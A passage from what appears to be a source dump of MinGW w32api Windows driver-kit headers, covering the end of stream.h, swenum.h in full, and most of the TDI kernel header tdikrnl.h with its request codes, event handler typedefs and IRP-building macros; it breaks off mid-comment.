typedef enum _STREAM_PRIORITY {
  High,
  Dispatch,
  Low,
  LowToHigh
} STREAM_PRIORITY, *PSTREAM_PRIORITY;


VOID
StreamClassAbortOutstandingRequests(
    IN PVOID HwDeviceExtension,
    IN PHW_STREAM_OBJECT HwStreamObject,
    IN NTSTATUS Status
);

VOID
STREAMAPI 
StreamClassCallAtNewPriority(
    IN PHW_STREAM_OBJECT  StreamObject,
    IN PVOID  HwDeviceExtension,
    IN STREAM_PRIORITY  Priority,
    IN PHW_PRIORITY_ROUTINE  PriorityRoutine,
    IN PVOID  Context
    );

VOID
STREAMAPI
StreamClassCompleteRequestAndMarkQueueReady(
    IN PHW_STREAM_REQUEST_BLOCK Srb
);

VOID
STREAMAPI
StreamClassDebugAssert(
    IN PCHAR File,
    IN ULONG Line,
    IN PCHAR AssertText,
    IN ULONG AssertValue
);

VOID
__cdecl
StreamClassDebugPrint(
    IN STREAM_DEBUG_LEVEL DebugPrintLevel,
    IN PCCHAR DebugMessage,
    ...
);

VOID
__cdecl
StreamClassDeviceNotification(
    IN STREAM_MINIDRIVER_DEVICE_NOTIFICATION_TYPE NotificationType,
    IN PVOID HwDeviceExtension,
    IN PHW_STREAM_REQUEST_BLOCK  pSrb,
    IN PKSEVENT_ENTRY  EventEntry,
    IN GUID  *EventSet,
    IN ULONG  EventId
);

VOID
STREAMAPI
StreamClassFilterReenumerateStreams(
    IN PVOID HwInstanceExtension,
    IN ULONG StreamDescriptorSize
);

PVOID
STREAMAPI
StreamClassGetDmaBuffer(
    IN PVOID HwDeviceExtension
);


PKSEVENT_ENTRY
StreamClassGetNextEvent(
    IN PVOID HwInstanceExtension_OR_HwDeviceExtension,
    IN PHW_STREAM_OBJECT HwStreamObject,
    IN GUID * EventGuid,
    IN ULONG EventItem,
    IN PKSEVENT_ENTRY CurrentEvent
);

STREAM_PHYSICAL_ADDRESS
STREAMAPI
StreamClassGetPhysicalAddress(
    IN PVOID HwDeviceExtension,
    IN PHW_STREAM_REQUEST_BLOCK HwSRB,
    IN PVOID VirtualAddress,
    IN STREAM_BUFFER_TYPE Type,
    IN ULONG * Length
);

VOID
StreamClassQueryMasterClock(
    IN PHW_STREAM_OBJECT HwStreamObject,
    IN HANDLE MasterClockHandle,
    IN TIME_FUNCTION TimeFunction,
    IN PHW_QUERY_CLOCK_ROUTINE ClockCallbackRoutine
);

VOID
STREAMAPI
StreamClassQueryMasterClockSync(
    IN HANDLE MasterClockHandle,
    IN PHW_TIME_CONTEXT TimeContext
);

BOOLEAN
STREAMAPI
StreamClassReadWriteConfig( 
    IN PVOID HwDeviceExtension,
    IN BOOLEAN Read,
    IN PVOID Buffer,
    IN ULONG Offset,
    IN ULONG Length
);

VOID
STREAMAPI
StreamClassReenumerateStreams(
    IN PVOID HwDeviceExtension,
    IN ULONG StreamDescriptorSize
);

NTSTATUS
STREAMAPI
StreamClassRegisterAdapter(
    IN PVOID Argument1,
    IN PVOID Argument2,
    IN PHW_INITIALIZATION_DATA HwInitializationData
);

#define StreamClassRegisterMinidriver StreamClassRegisterAdapter

NTSTATUS
StreamClassRegisterFilterWithNoKSPins( 
    IN PDEVICE_OBJECT   DeviceObject,
    IN const GUID     * InterfaceClassGUID,
    IN ULONG            PinCount,
    IN BOOLEAN * PinDirection,
    IN KSPIN_MEDIUM * MediumList,
    IN GUID * CategoryList
);

VOID
STREAMAPI
StreamClassScheduleTimer(
    IN PHW_STREAM_OBJECT StreamObject,
    IN PVOID HwDeviceExtension,
    IN ULONG NumberOfMicroseconds,
    IN PHW_TIMER_ROUTINE TimerRoutine,
    IN PVOID Context
);

VOID
__cdecl
StreamClassStreamNotification(
    IN STREAM_MINIDRIVER_STREAM_NOTIFICATION_TYPE NotificationType,
    IN PHW_STREAM_OBJECT StreamObject,
    IN ...
);

#endif /* _STREAM_H */


```

`include/ddk/swenum.h`:

```h
#ifndef _SWENUM_
#define _SWENUM_

#define IOCTL_SWENUM_INSTALL_INTERFACE CTL_CODE(FILE_DEVICE_BUS_EXTENDER, 0x000, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SWENUM_REMOVE_INTERFACE CTL_CODE(FILE_DEVICE_BUS_EXTENDER, 0x001, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SWENUM_GET_BUS_ID CTL_CODE(FILE_DEVICE_BUS_EXTENDER, 0x002, METHOD_NEITHER, FILE_READ_ACCESS)

typedef struct _SWENUM_INSTALL_INTERFACE {
  GUID   DeviceId;
  GUID   InterfaceId;
  WCHAR  ReferenceString[1];
} SWENUM_INSTALL_INTERFACE, *PSWENUM_INSTALL_INTERFACE;

#if defined(_KS_)
#define STATIC_BUSID_SoftwareDeviceEnumerator STATIC_KSMEDIUMSETID_Standard
#define BUSID_SoftwareDeviceEnumerator KSMEDIUMSETID_Standard
#else
#define STATIC_BUSID_SoftwareDeviceEnumerator \
    0x4747B320L, 0x62CE, 0x11CF, 0xA5, 0xD6, 0x28, 0xDB, 0x04, 0xC1, 0x00, 0x00
#endif /* _KS_ */

#if defined(_NTDDK_)

#if !defined(_KS_)
typedef VOID (NTAPI *PFNREFERENCEDEVICEOBJECT)(PVOID Context);
typedef VOID (NTAPI *PFNDEREFERENCEDEVICEOBJECT)(PVOID Context);
typedef NTSTATUS (NTAPI *PFNQUERYREFERENCESTRING)(PVOID Context, PWCHAR *String);
#endif /* _KS_ */

#define BUS_INTERFACE_SWENUM_VERSION    0x100

typedef struct _BUS_INTERFACE_SWENUM {
  INTERFACE Interface;
  PFNREFERENCEDEVICEOBJECT ReferenceDeviceObject;
  PFNDEREFERENCEDEVICEOBJECT DereferenceDeviceObject;
  PFNQUERYREFERENCESTRING QueryReferenceString;
} BUS_INTERFACE_SWENUM, *PBUS_INTERFACE_SWENUM;

#if defined(__cplusplus)
extern "C" {
#endif

#if defined(_KS_)

KSDDKAPI
NTSTATUS
NTAPI
KsQuerySoftwareBusInterface(
    IN PDEVICE_OBJECT PnpDeviceObject,
    OUT PBUS_INTERFACE_SWENUM BusInterface
);

KSDDKAPI
NTSTATUS
NTAPI
KsReferenceSoftwareBusObject(
    IN KSDEVICE_HEADER Header
);

KSDDKAPI
VOID
NTAPI
KsDereferenceSoftwareBusObject(
    IN KSDEVICE_HEADER  Header
);

KSDDKAPI
NTSTATUS
NTAPI
KsCreateBusEnumObject(
    IN PWSTR BusIdentifier,
    IN PDEVICE_OBJECT BusDeviceObject,
    IN PDEVICE_OBJECT PhysicalDeviceObject,
    IN PDEVICE_OBJECT PnpDeviceObject,
    IN REFGUID InterfaceGuid,
    IN PWSTR ServiceRelativePath
);

KSDDKAPI
NTSTATUS
NTAPI
KsGetBusEnumIdentifier(
    IN OUT PIRP Irp
);

KSDDKAPI
NTSTATUS
NTAPI
KsGetBusEnumPnpDeviceObject(
    IN PDEVICE_OBJECT DeviceObject,
    OUT PDEVICE_OBJECT *PnpDeviceObject
);

KSDDKAPI
NTSTATUS
NTAPI
KsInstallBusEnumInterface(
    IN PIRP Irp
);

KSDDKAPI
NTSTATUS
NTAPI
KsIsBusEnumChildDevice(
    IN PDEVICE_OBJECT DeviceObject,
    OUT PBOOLEAN ChildDevice
);


KSDDKAPI
NTSTATUS
NTAPI
KsRemoveBusEnumInterface(
    IN PIRP Irp
);

KSDDKAPI
NTSTATUS
NTAPI
KsServiceBusEnumPnpRequest(
    IN PDEVICE_OBJECT DeviceObject,
    IN OUT PIRP Irp
);

KSDDKAPI
NTSTATUS
NTAPI
KsServiceBusEnumCreateRequest(
    IN PDEVICE_OBJECT DeviceObject,
    IN OUT PIRP Irp
);

KSDDKAPI
NTSTATUS
NTAPI
KsGetBusEnumParentFDOFromChildPDO(
    IN PDEVICE_OBJECT DeviceObject,
    OUT PDEVICE_OBJECT *FunctionalDeviceObject
);

#endif /* _KS_ */

#if defined(__cplusplus)
}
#endif

#endif /* _NTDDK_ */

#endif /* _SWENUM_ */


```

`include/ddk/tdikrnl.h`:

```h
/*
 * tdikrnl.h
 *
 * TDI kernel mode definitions
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __TDIKRNL_H
#define __TDIKRNL_H

#include "tdi.h"

#ifdef __cplusplus
extern "C" {
#endif

#if defined(_TDI_)
#define TDIKRNLAPI
#else
#define TDIKRNLAPI DECLSPEC_IMPORT
#endif


typedef struct _TDI_REQUEST_KERNEL {
  ULONG  RequestFlags;
  PTDI_CONNECTION_INFORMATION  RequestConnectionInformation;
  PTDI_CONNECTION_INFORMATION  ReturnConnectionInformation;
  PVOID  RequestSpecific;
} TDI_REQUEST_KERNEL, *PTDI_REQUEST_KERNEL;

/* Request codes */
#define TDI_ASSOCIATE_ADDRESS             0x01
#define TDI_DISASSOCIATE_ADDRESS          0x02
#define TDI_CONNECT                       0x03
#define TDI_LISTEN                        0x04
#define TDI_ACCEPT                        0x05
#define TDI_DISCONNECT                    0x06
#define TDI_SEND                          0x07
#define TDI_RECEIVE                       0x08
#define TDI_SEND_DATAGRAM                 0x09
#define TDI_RECEIVE_DATAGRAM              0x0A
#define TDI_SET_EVENT_HANDLER             0x0B
#define TDI_QUERY_INFORMATION             0x0C
#define TDI_SET_INFORMATION               0x0D
#define TDI_ACTION                        0x0E

#define TDI_DIRECT_SEND                   0x27
#define TDI_DIRECT_SEND_DATAGRAM          0x29

#define TDI_TRANSPORT_ADDRESS_FILE        1
#define TDI_CONNECTION_FILE               2
#define TDI_CONTROL_CHANNEL_FILE          3

/* Internal TDI IOCTLS */
#define IOCTL_TDI_QUERY_DIRECT_SEND_HANDLER   _TDI_CONTROL_CODE(0x80, METHOD_NEITHER)
#define IOCTL_TDI_QUERY_DIRECT_SENDDG_HANDLER _TDI_CONTROL_CODE(0x81, METHOD_NEITHER)

/* TdiAssociateAddress */
typedef struct _TDI_REQUEST_KERNEL_ASSOCIATE {
  HANDLE  AddressHandle;
} TDI_REQUEST_KERNEL_ASSOCIATE, *PTDI_REQUEST_KERNEL_ASSOCIATE;

/* TdiDisassociateAddress */
typedef TDI_REQUEST_KERNEL TDI_REQUEST_KERNEL_DISASSOCIATE,
  *PTDI_REQUEST_KERNEL_DISASSOCIATE;

/* TdiAccept */
typedef struct _TDI_REQUEST_KERNEL_ACCEPT {
  PTDI_CONNECTION_INFORMATION  RequestConnectionInformation;
  PTDI_CONNECTION_INFORMATION  ReturnConnectionInformation;
} TDI_REQUEST_KERNEL_ACCEPT, *PTDI_REQUEST_KERNEL_ACCEPT;

/* TdiConnect */
typedef TDI_REQUEST_KERNEL TDI_REQUEST_KERNEL_CONNECT,
  *PTDI_REQUEST_KERNEL_CONNECT;

/* TdiDisconnect */
typedef TDI_REQUEST_KERNEL TDI_REQUEST_KERNEL_DISCONNECT,
  *PTDI_REQUEST_KERNEL_DISCONNECT;

/* TdiListen */
typedef TDI_REQUEST_KERNEL TDI_REQUEST_KERNEL_LISTEN,
  *PTDI_REQUEST_KERNEL_LISTEN;

/* TdiReceive */
typedef struct _TDI_REQUEST_KERNEL_RECEIVE {
  ULONG  ReceiveLength;
  ULONG  ReceiveFlags;
} TDI_REQUEST_KERNEL_RECEIVE, *PTDI_REQUEST_KERNEL_RECEIVE;

/* TdiReceiveDatagram */
typedef struct _TDI_REQUEST_KERNEL_RECEIVEDG {
  ULONG  ReceiveLength;
  PTDI_CONNECTION_INFORMATION  ReceiveDatagramInformation;
  PTDI_CONNECTION_INFORMATION  ReturnDatagramInformation;
  ULONG  ReceiveFlags;
} TDI_REQUEST_KERNEL_RECEIVEDG, *PTDI_REQUEST_KERNEL_RECEIVEDG;

/* TdiSend */
typedef struct _TDI_REQUEST_KERNEL_SEND {
  ULONG  SendLength;
  ULONG  SendFlags;
} TDI_REQUEST_KERNEL_SEND, *PTDI_REQUEST_KERNEL_SEND;

/* TdiSendDatagram */
typedef struct _TDI_REQUEST_KERNEL_SENDDG {
  ULONG  SendLength;
  PTDI_CONNECTION_INFORMATION  SendDatagramInformation;
} TDI_REQUEST_KERNEL_SENDDG, *PTDI_REQUEST_KERNEL_SENDDG;

/* TdiSetEventHandler */
typedef struct _TDI_REQUEST_KERNEL_SET_EVENT {
  LONG  EventType;
  PVOID  EventHandler;
  PVOID  EventContext;
} TDI_REQUEST_KERNEL_SET_EVENT, *PTDI_REQUEST_KERNEL_SET_EVENT;

/* TdiQueryInformation */
typedef struct _TDI_REQUEST_KERNEL_QUERY_INFO {
  LONG  QueryType;
  PTDI_CONNECTION_INFORMATION  RequestConnectionInformation;
} TDI_REQUEST_KERNEL_QUERY_INFORMATION, *PTDI_REQUEST_KERNEL_QUERY_INFORMATION;

/* TdiSetInformation */
typedef struct _TDI_REQUEST_KERNEL_SET_INFO {
  LONG  SetType;
  PTDI_CONNECTION_INFORMATION  RequestConnectionInformation;
} TDI_REQUEST_KERNEL_SET_INFORMATION, *PTDI_REQUEST_KERNEL_SET_INFORMATION;


/* Event types */
#define TDI_EVENT_CONNECT                   0
#define TDI_EVENT_DISCONNECT                1
#define TDI_EVENT_ERROR                     2
#define TDI_EVENT_RECEIVE                   3
#define TDI_EVENT_RECEIVE_DATAGRAM          4
#define TDI_EVENT_RECEIVE_EXPEDITED         5
#define TDI_EVENT_SEND_POSSIBLE             6
#define TDI_EVENT_CHAINED_RECEIVE           7
#define TDI_EVENT_CHAINED_RECEIVE_DATAGRAM  8
#define TDI_EVENT_CHAINED_RECEIVE_EXPEDITED 9
#define TDI_EVENT_ERROR_EX                  10

typedef NTSTATUS
(NTAPI *PTDI_IND_CONNECT)(
  IN PVOID  TdiEventContext,
  IN LONG  RemoteAddressLength,
  IN PVOID  RemoteAddress,
  IN LONG  UserDataLength,
  IN PVOID  UserData,
  IN LONG  OptionsLength,
  IN PVOID  Options,
  OUT CONNECTION_CONTEXT  *ConnectionContext,
  OUT PIRP  *AcceptIrp);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDefaultConnectHandler(
  IN PVOID  TdiEventContext,
  IN LONG  RemoteAddressLength,
  IN PVOID  RemoteAddress,
  IN LONG  UserDataLength,
  IN PVOID  UserData,
  IN LONG  OptionsLength,
  IN PVOID  Options,
  OUT CONNECTION_CONTEXT *ConnectionContext,
  OUT PIRP  *AcceptIrp);

typedef NTSTATUS
(NTAPI *PTDI_IND_DISCONNECT)(
  IN PVOID  TdiEventContext,
  IN CONNECTION_CONTEXT  ConnectionContext,
  IN LONG  DisconnectDataLength,
  IN PVOID  DisconnectData,
  IN LONG  DisconnectInformationLength,
  IN PVOID  DisconnectInformation,
  IN ULONG  DisconnectFlags);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDefaultDisconnectHandler(
  IN PVOID  TdiEventContext,
  IN CONNECTION_CONTEXT  ConnectionContext,
  IN LONG  DisconnectDataLength,
  IN PVOID  DisconnectData,
  IN LONG  DisconnectInformationLength,
  IN PVOID  DisconnectInformation,
  IN ULONG  DisconnectFlags);

typedef NTSTATUS
(NTAPI *PTDI_IND_ERROR)(
  IN PVOID  TdiEventContext,
  IN NTSTATUS  Status);

typedef NTSTATUS
(NTAPI *PTDI_IND_ERROR_EX)(
  IN PVOID  TdiEventContext,
  IN NTSTATUS  Status,
  IN PVOID  Buffer);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDefaultErrorHandler(
  IN PVOID  TdiEventContext,
  IN NTSTATUS  Status);

typedef NTSTATUS
(NTAPI *PTDI_IND_RECEIVE)(
  IN PVOID  TdiEventContext,
  IN CONNECTION_CONTEXT  ConnectionContext,
  IN ULONG  ReceiveFlags,
  IN ULONG  BytesIndicated,
  IN ULONG  BytesAvailable,
  OUT ULONG  *BytesTaken,
  IN PVOID  Tsdu,
  OUT PIRP  *IoRequestPacket);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDefaultReceiveHandler(
  IN PVOID  TdiEventContext,
  IN CONNECTION_CONTEXT  ConnectionContext,
  IN ULONG  ReceiveFlags,
  IN ULONG  BytesIndicated,
  IN ULONG  BytesAvailable,
  OUT ULONG  *BytesTaken,
  IN PVOID  Tsdu,
  OUT PIRP  *IoRequestPacket);

typedef NTSTATUS
(NTAPI *PTDI_IND_RECEIVE_DATAGRAM)(
  IN PVOID  TdiEventContext,
  IN LONG  SourceAddressLength,
  IN PVOID  SourceAddress,
  IN LONG  OptionsLength,
  IN PVOID  Options,
  IN ULONG  ReceiveDatagramFlags,
  IN ULONG  BytesIndicated,
  IN ULONG  BytesAvailable,
  OUT ULONG  *BytesTaken,
  IN PVOID  Tsdu,
  OUT PIRP  *IoRequestPacket);

TDIKRNLAPI
NTSTATUS NTAPI
TdiDefaultRcvDatagramHandler(
  IN PVOID  TdiEventContext,
  IN LONG  SourceAddressLength,
  IN PVOID  SourceAddress,
  IN LONG  OptionsLength,
  IN PVOID  Options,
  IN ULONG  ReceiveDatagramFlags,
  IN ULONG  BytesIndicated,
  IN ULONG  BytesAvailable,
  OUT ULONG  *BytesTaken,
  IN PVOID  Tsdu,
  OUT PIRP  *IoRequestPacket);

typedef NTSTATUS
(NTAPI *PTDI_IND_RECEIVE_EXPEDITED)(
  IN PVOID  TdiEventContext,
  IN CONNECTION_CONTEXT  ConnectionContext,
  IN ULONG  ReceiveFlags,
  IN ULONG  BytesIndicated,
  IN ULONG  BytesAvailable,
  OUT ULONG  *BytesTaken,
  IN PVOID  Tsdu,
  OUT PIRP  *IoRequestPacket);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDefaultRcvExpeditedHandler(
  IN PVOID  TdiEventContext,
  IN CONNECTION_CONTEXT  ConnectionContext,
  IN ULONG  ReceiveFlags,
  IN ULONG  BytesIndicated,
  IN ULONG  BytesAvailable,
  OUT ULONG  *BytesTaken,
  IN PVOID  Tsdu,
  OUT PIRP  *IoRequestPacket);

typedef NTSTATUS
(NTAPI *PTDI_IND_CHAINED_RECEIVE)(
  IN PVOID  TdiEventContext,
  IN CONNECTION_CONTEXT  ConnectionContext,
  IN ULONG  ReceiveFlags,
  IN ULONG  ReceiveLength,
  IN ULONG  StartingOffset,
  IN PMDL  Tsdu,
  IN PVOID  TsduDescriptor);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDefaultChainedReceiveHandler(
  IN PVOID  TdiEventContext,
  IN CONNECTION_CONTEXT  ConnectionContext,
  IN ULONG  ReceiveFlags,
  IN ULONG  ReceiveLength,
  IN ULONG  StartingOffset,
  IN PMDL  Tsdu,
  IN PVOID  TsduDescriptor);

typedef NTSTATUS
(NTAPI *PTDI_IND_CHAINED_RECEIVE_DATAGRAM)(
  IN PVOID  TdiEventContext,
  IN LONG  SourceAddressLength,
  IN PVOID  SourceAddress,
  IN LONG  OptionsLength,
  IN PVOID  Options,
  IN ULONG  ReceiveDatagramFlags,
  IN ULONG  ReceiveDatagramLength,
  IN ULONG  StartingOffset,
  IN PMDL  Tsdu,
  IN PVOID  TsduDescriptor);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDefaultChainedRcvDatagramHandler(
  IN PVOID  TdiEventContext,
  IN LONG  SourceAddressLength,
  IN PVOID  SourceAddress,
  IN LONG  OptionsLength,
  IN PVOID  Options,
  IN ULONG  ReceiveDatagramFlags,
  IN ULONG  ReceiveDatagramLength,
  IN ULONG  StartingOffset,
  IN PMDL  Tsdu,
  IN PVOID  TsduDescriptor);

typedef NTSTATUS
(NTAPI *PTDI_IND_CHAINED_RECEIVE_EXPEDITED)(
  IN PVOID  TdiEventContext,
  IN CONNECTION_CONTEXT  ConnectionContext,
  IN ULONG  ReceiveFlags,
  IN ULONG  ReceiveLength,
  IN ULONG  StartingOffset,
  IN PMDL  Tsdu,
  IN PVOID  TsduDescriptor);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDefaultChainedRcvExpeditedHandler(
  IN PVOID  TdiEventContext,
  IN CONNECTION_CONTEXT  ConnectionContext,
  IN ULONG  ReceiveFlags,
  IN ULONG  ReceiveLength,
  IN ULONG  StartingOffset,
  IN PMDL  Tsdu,
  IN PVOID  TsduDescriptor);

typedef NTSTATUS
(NTAPI *PTDI_IND_SEND_POSSIBLE)(
  IN PVOID  TdiEventContext,
  IN PVOID  ConnectionContext,
  IN ULONG  BytesAvailable);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiDefaultSendPossibleHandler(
  IN PVOID  TdiEventContext,
  IN PVOID  ConnectionContext,
  IN ULONG  BytesAvailable);



/* Macros and functions to build IRPs */

#define TdiBuildBaseIrp(                                                  \
  bIrp, bDevObj, bFileObj, bCompRoutine, bContxt, bIrpSp, bMinor)         \
{                                                                         \
  bIrpSp->MajorFunction = IRP_MJ_INTERNAL_DEVICE_CONTROL;                 \
  bIrpSp->MinorFunction = (bMinor);                                       \
  bIrpSp->DeviceObject  = (bDevObj);                                      \
  bIrpSp->FileObject    = (bFileObj);                                     \
  if (bCompRoutine)                                                       \
  {                                                                       \
    IoSetCompletionRoutine(bIrp, bCompRoutine, bContxt, TRUE, TRUE, TRUE);\
  }                                                                       \
  else                                                                    \
    IoSetCompletionRoutine(bIrp, NULL, NULL, FALSE, FALSE, FALSE);        \
}

/*
 * VOID
 * TdiBuildAccept(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt,
 *   IN PTDI_CONNECTION_INFORMATION  RequestConnectionInfo,
 *   OUT PTDI_CONNECTION_INFORMATION  ReturnConnectionInfo);
 */
#define TdiBuildAccept(                                             \
  Irp, DevObj, FileObj, CompRoutine, Contxt,                        \
  RequestConnectionInfo, ReturnConnectionInfo)                      \
{                                                                   \
  PTDI_REQUEST_KERNEL_ACCEPT _Request;                              \
  PIO_STACK_LOCATION _IrpSp;                                        \
                                                                    \
  _IrpSp = IoGetNextIrpStackLocation(Irp);                          \
                                                                    \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,                \
                  Contxt, _IrpSp, TDI_ACCEPT);                      \
                                                                    \
  _Request = (PTDI_REQUEST_KERNEL_ACCEPT)&_IrpSp->Parameters;       \
  _Request->RequestConnectionInformation = (RequestConnectionInfo); \
  _Request->ReturnConnectionInformation  = (ReturnConnectionInfo);  \
}

/*
 * VOID
 * TdiBuildAction(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt,
 *   IN PMDL  MdlAddr);
 */
#define TdiBuildAction(                               \
  Irp, DevObj, FileObj, CompRoutine, Contxt, MdlAddr) \
{                                                     \
  PIO_STACK_LOCATION _IrpSp;                          \
                                                      \
  _IrpSp = IoGetNextIrpStackLocation(Irp);            \
                                                      \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,  \
                  Contxt, _IrpSp, TDI_ACTION);        \
                                                      \
  (Irp)->MdlAddress = (MdlAddr);                      \
}

/*
 * VOID
 * TdiBuildAssociateAddress(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt,
 *   IN HANDLE  AddrHandle);
 */
#define TdiBuildAssociateAddress(                                \
  Irp, DevObj, FileObj, CompRoutine, Contxt, AddrHandle)         \
{                                                                \
  PTDI_REQUEST_KERNEL_ASSOCIATE _Request;                        \
  PIO_STACK_LOCATION _IrpSp;                                     \
                                                                 \
  _IrpSp = IoGetNextIrpStackLocation(Irp);                       \
                                                                 \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,             \
                  Contxt, _IrpSp, TDI_ASSOCIATE_ADDRESS);        \
                                                                 \
  _Request = (PTDI_REQUEST_KERNEL_ASSOCIATE)&_IrpSp->Parameters; \
  _Request->AddressHandle = (HANDLE)(AddrHandle);                \
}

/*
 * VOID
 * TdiBuildConnect(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt,
 *   IN PLARGE_INTEGER  Time,
 *   IN PTDI_CONNECTION_INFORMATION  RequestConnectionInfo,
 *   OUT PTDI_CONNECTION_INFORMATION  ReturnConnectionInfo);
 */
#define TdiBuildConnect(                                            \
  Irp, DevObj, FileObj, CompRoutine, Contxt,                        \
  Time, RequestConnectionInfo, ReturnConnectionInfo)                \
{                                                                   \
  PTDI_REQUEST_KERNEL _Request;                                     \
  PIO_STACK_LOCATION _IrpSp;                                        \
                                                                    \
  _IrpSp = IoGetNextIrpStackLocation(Irp);                          \
                                                                    \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,                \
                  Contxt, _IrpSp, TDI_CONNECT);                     \
                                                                    \
  _Request = (PTDI_REQUEST_KERNEL)&_IrpSp->Parameters;              \
  _Request->RequestConnectionInformation = (RequestConnectionInfo); \
  _Request->ReturnConnectionInformation  = (ReturnConnectionInfo);  \
  _Request->RequestSpecific              = (PVOID)(Time);           \
}

/*
 * VOID
 * TdiBuildDisassociateAddress(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt);
 */
#define TdiBuildDisassociateAddress(                                \
  Irp, DevObj, FileObj, CompRoutine, Contxt)                        \
{                                                                   \
  PIO_STACK_LOCATION _IrpSp;                                        \
                                                                    \
  _IrpSp = IoGetNextIrpStackLocation(Irp);                          \
                                                                    \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,                \
                  Contxt, _IrpSp, TDI_DISASSOCIATE_ADDRESS);        \
}

/*
 * VOID
 * TdiBuildDisconnect(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt,
 *   IN PLARGE_INTEGER  Time,
 *   IN PULONG  Flags,
 *   IN PTDI_CONNECTION_INFORMATION  RequestConnectionInfo,
 *   OUT PTDI_CONNECTION_INFORMATION  ReturnConnectionInfo);
 */
#define TdiBuildDisconnect(                                         \
  Irp, DevObj, FileObj, CompRoutine, Contxt, Time,                  \
  Flags, RequestConnectionInfo, ReturnConnectionInfo)               \
{                                                                   \
  PTDI_REQUEST_KERNEL _Request;                                     \
  PIO_STACK_LOCATION _IrpSp;                                        \
                                                                    \
  _IrpSp = IoGetNextIrpStackLocation(Irp);                          \
                                                                    \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,                \
                  Contxt, _IrpSp, TDI_DISCONNECT);                  \
                                                                    \
  _Request = (PTDI_REQUEST_KERNEL)&_IrpSp->Parameters;              \
  _Request->RequestConnectionInformation = (RequestConnectionInfo); \
  _Request->ReturnConnectionInformation  = (ReturnConnectionInfo);  \
  _Request->RequestSpecific = (PVOID)(Time);                        \
  _Request->RequestFlags    = (Flags);                              \
}

/*
 * PIRP
 * TdiBuildInternalDeviceControlIrp(
 *   IN CCHAR IrpSubFunction,
 *   IN PDEVICE_OBJECT DeviceObject,
 *   IN PFILE_OBJECT FileObject,
 *   IN PKEVENT Event,
 *   IN PIO_STATUS_BLOCK IoStatusBlock);
 */
#define TdiBuildInternalDeviceControlIrp( \
  IrpSubFunction, DeviceObject,           \
  FileObject, Event, IoStatusBlock)       \
  IoBuildDeviceIoControlRequest(          \
		IrpSubFunction, DeviceObject,             \
		NULL, 0, NULL, 0,                     \
		TRUE, Event, IoStatusBlock)

/*
 * VOID
 * TdiBuildListen(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
 *   IN PVOID  CompRoutine,
 *   IN PVOID  Contxt,
 *   IN ULONG  Flags,
 *   IN PTDI_CONNECTION_INFORMATION  RequestConnectionInfo,
 *   OUT PTDI_CONNECTION_INFORMATION  ReturnConnectionInfo);
 */
#define TdiBuildListen(                                             \
  Irp, DevObj, FileObj, CompRoutine, Contxt,                        \
  Flags, RequestConnectionInfo, ReturnConnectionInfo)               \
{                                                                   \
  PTDI_REQUEST_KERNEL _Request;                                     \
  PIO_STACK_LOCATION _IrpSp;                                        \
                                                                    \
  _IrpSp = IoGetNextIrpStackLocation(Irp);                          \
                                                                    \
  TdiBuildBaseIrp(Irp, DevObj, FileObj, CompRoutine,                \
                  Contxt, _IrpSp, TDI_LISTEN);                      \
                                                                    \
  _Request = (PTDI_REQUEST_KERNEL)&_IrpSp->Parameters;              \
  _Request->RequestConnectionInformation = (RequestConnectionInfo); \
  _Request->ReturnConnectionInformation  = (ReturnConnectionInfo);  \
  _Request->RequestFlags = (Flags);                                 \
}

TDIKRNLAPI
VOID
NTAPI
TdiBuildNetbiosAddress(
	IN PUCHAR  NetbiosName,
	IN BOOLEAN  IsGroupName,
	IN OUT PTA_NETBIOS_ADDRESS  NetworkName);

TDIKRNLAPI
NTSTATUS
NTAPI
TdiBuildNetbiosAddressEa(
  IN PUCHAR  Buffer,
  IN BOOLEAN  IsGroupName,
  IN PUCHAR  NetbiosName);

/*
 * VOID
 * TdiBuildQueryInformation(
 *   IN PIRP  Irp,
 *   IN PDEVICE_OBJECT  DevObj,
 *   IN PFILE_OBJECT  FileObj,
